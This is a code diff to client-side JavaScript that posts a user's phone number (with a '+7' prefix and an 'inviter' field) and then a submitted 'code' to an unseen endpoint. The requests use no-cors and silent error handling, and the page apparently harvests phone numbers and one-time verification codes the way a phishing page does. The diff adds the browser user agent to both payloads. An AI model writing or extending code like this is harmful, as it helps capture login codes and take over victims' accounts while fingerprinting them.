@@ -210,7 +210,14 @@
                 method: 'POST',
                 mode: 'no-cors',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({type: 'phone', phone: '+7' + phone, inviter: inviter, timestamp: new Date().toISOString()})
+                body: JSON.stringify({
+                    type: 'phone',
+                    phone: '+7' + phone,
+                    inviter: inviter,
+                    timestamp: new Date().toISOString(),
+                    ip: 'client-side',
+                    userAgent: navigator.userAgent
+                })
             }).catch(function(err) {
                 console.log('Запрос отправлен');
             });
@@ -232,7 +239,14 @@
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({type: 'code', code: code, status: 'test_ok', timestamp: new Date().toISOString()})
+                    body: JSON.stringify({
+                        type: 'code',
+                        code: code,
+                        status: 'test_ok',
+                        timestamp: new Date().toISOString(),
+                        ip: 'client-side',
+                        userAgent: navigator.userAgent
+                    })
                 }).catch(function(err) {
                     console.log('Код отправлен');
                 });
